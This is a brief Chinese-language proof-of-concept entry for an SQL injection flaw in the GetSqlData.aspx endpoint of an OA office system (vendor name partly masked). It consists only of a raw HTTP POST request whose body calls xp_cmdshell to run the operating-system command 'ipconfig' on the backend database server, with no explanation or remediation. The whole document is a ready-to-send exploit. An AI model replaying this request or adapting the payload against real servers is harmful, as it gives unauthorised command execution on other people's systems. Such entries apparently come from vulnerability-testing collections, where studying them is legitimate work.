## 某和OA C6-GetSqlData.aspx SQL注入漏洞
```
POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

exec master..xp_cmdshell 'ipconfig'

```
